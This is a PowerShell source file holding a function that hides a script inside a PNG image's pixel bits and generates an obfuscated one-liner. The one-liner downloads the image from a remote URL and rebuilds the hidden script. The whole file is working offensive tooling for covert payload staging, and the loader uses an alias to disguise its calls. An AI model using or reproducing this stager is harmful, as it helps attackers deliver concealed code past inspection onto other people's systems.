function Invoke-IMGSTG
{

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $Script,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Out,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Image
    )

    $ErrorActionPreference = "Stop"

    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Web")

    if (-Not [System.IO.Path]::IsPathRooted($Script)){
        $Script = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Script))
    }
    if (-Not [System.IO.Path]::IsPathRooted($Out)){
        $Out = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Out))
    }

    $imgurl = "http://example.com/" + [System.IO.Path]::GetFileName($Out)

    # Read in the script
    #$ScriptBlockString = [IO.File]::ReadAllText($Script)
    $ScriptBlockString = Get-Content -Path $Script -Encoding UTF8 -Raw
    #$in = [ScriptBlock]::Create($ScriptBlockString)
    $pload = [system.Text.Encoding]::UTF8.GetBytes($ScriptBlockString)

    if ($Image) {

        if (-Not [System.IO.Path]::IsPathRooted($Image)){
            $Image = [System.IO.Path]::GetFullPath((Join-Path (Get-Location) $Image))
        }

        # Read the image into a bitmap
        $img = New-Object System.Drawing.Bitmap($Image)

        $width = $img.Size.Width
        $height = $img.Size.Height


        $rect = New-Object System.Drawing.Rectangle(0, 0, $width, $height);
        $bmpData = $img.LockBits($rect, [System.Drawing.Imaging.ImageLockMode]::ReadWrite, $img.PixelFormat)
        $ptr = $bmpData.Scan0


        $bytes  = [Math]::Abs($bmpData.Stride) * $img.Height
        $rgbValues = New-Object byte[] $bytes;
        [System.Runtime.InteropServices.Marshal]::Copy($ptr, $rgbValues, 0, $bytes);


        if($bytes/2 -lt $pload.Length) {
            Write-Error "Image not large enough to contain payload!"
            $img.UnlockBits($bmpData)
            $img.Dispose()
            Break
        }


        $randstr = [System.Web.Security.Membership]::GeneratePassword(128,0)
        $randb = [system.Text.Encoding]::ASCII.GetBytes($randstr)


        for ($counter = 0; $counter -lt ($rgbValues.Length)/3; $counter++) {
            if ($counter -lt $pload.Length){
                $paybyte1 = [math]::Floor($pload[$counter]/16)
                $paybyte2 = ($pload[$counter] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            } else {
                $paybyte1 = ($randb[$counter%113] -band 0x0f)
                $paybyte2 = ($randb[($counter+1)%67] -band 0x0f)
                $paybyte3 = ($randb[($counter+2)%109] -band 0x0f)
            }
            $rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1
            $rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2
            $rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3
        }


        [System.Runtime.InteropServices.Marshal]::Copy($rgbValues, 0, $ptr, $bytes)
        $img.UnlockBits($bmpData)


        $img.Save($Out, [System.Drawing.Imaging.ImageFormat]::Png)
        $img.Dispose()


        $rows = [math]::Ceiling($pload.Length/$width)
        $array = ($rows*$width)
        $lrows = ($rows-1)
        $lwidth = ($width-1)
        $lpload = ($pload.Length-1)

        $pscmd = "Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;(`$dd=abc System.Windows.Forms.PictureBox).Load(`"$imgurl`");`$gg=`$dd.Image;`$oo=abc Byte[] $array;(0..$lrows)|%{foreach(`$x in(0..$lwidth)){`$p=`$gg.GetPixel(`$x,`$_);`$oo[`$_*$width+`$x]=([math]::Floor((`$p.B-band15)*16)-bor(`$p.G -band 15))}};`$egh=[System.Text.Encoding]::UTF8.GetString(`$oo[0..$lpload]);Write-Output -InputObject `$egh"

        return $pscmd

    } else {
        Write-Output "Please provide an Image ! \n"
    }
}
